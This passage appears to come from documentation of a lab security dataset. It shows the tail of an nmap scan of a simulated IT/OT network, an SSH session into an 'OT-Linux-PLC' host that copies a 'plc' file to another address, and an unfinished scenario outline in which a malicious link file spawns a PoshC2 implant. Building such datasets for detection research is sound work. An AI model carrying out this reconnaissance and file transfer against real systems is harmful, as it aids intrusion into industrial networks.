| Not valid before: 2024-11-22T12:32:56
|_Not valid after:  2025-05-24T12:32:56
| rdp-ntlm-info:
|   Target_Name: IT-WIN-SHARE
|   NetBIOS_Domain_Name: IT-WIN-SHARE
|   NetBIOS_Computer_Name: IT-WIN-SHARE
|   DNS_Domain_Name: it-win-share
|   DNS_Computer_Name: it-win-share
|   Product_Version: 10.0.17763
|357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2024-11-22T12:38:49
|_Not valid after:  2034-11-21T12:38:49
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
|_ssl-date: 2024-11-23T16:36:13+00:00; 0s from scanner time.
|_http-title: Not Found
Oevice type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019

Host script results:
|_clock-skew: mean: -11m59s, deviation: 26m48s, median: 0s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard Evaluation 17763 (Windows Server 2019 Standard Evaluation 6.3)
|   Computer name: it-win-share
|   NetBIOS computer name: IT-WIN-SHARE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-11-23T17:35:46+01:00

Post-scan script results:
| clock-skew:
|   0s:
|     10.0.2.15 (host-10-0-2-15.openstacklocal)
|_    10.0.2.20 (host-10-0-2-20.openstacklocal)
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (7 hosts up) scanned in 183.65 seconds
PS C:\> ssh -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password debian@10.0.2.17 -p 80
The authenticity of host '[10.0.2.17]:80 ([10.0.2.17]:80)' can't be established.
ECDSA key fingerprint is SHA256:sJfYywS8zola6CUyy0OZ+exxOhq4p9trQXTZRbC28gU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.0.2.17]:80' (ECDSA) to the list of known hosts.
debian@10.0.2.17's password:

--> 

Linux OT-Linux-PLC 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64  

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
debian@OT-Linux-PLC:~$ ls  
OT-Linux-PLC_logs.tar.gz  OT-Linux-PLC_pcap.tar.gz  audit.rules  plc  tshark
debian@OT-Linux-PLC:~$ scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password plc debian@10.1.3.165:/home/debian/
The authenticity of host '10.1.3.165 (10.1.3.165)' can't be established.
ED25519 key fingerprint is SHA256:g4LA5KQN9wNSN+DMyDuaeEs3f3nzsgQlBYfUVzMqbbU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.1.3.165' (ED25519) to the list of known hosts.  
debian@10.1.3.165's password:   
plc                                                                               100%   16KB   8.6MB/s   00:00     
debian@OT-Linux-PLC:~$ ls
debian@OT-Linux-PLC:~$ scp -o PasswordAuthentication=yes -o PubkeyAuthentication=no -o PreferredAuthentications=password plc debian@10.1.3.165:/home/debian/

```



## Single-Host Attack

Dataset folder name: 

Involved Hosts:
    - IT-Win-PC-1
    - APT-Outside-Attacker (not recorded)

Duration:

Activity:
    - User TestUser clicks on malicious link file which spawns an implant for APT-Outside-Attacker PoshC2 Server
    - Attacker gets access to powershell, performs local and network reconnaisance and 

execution log:




    
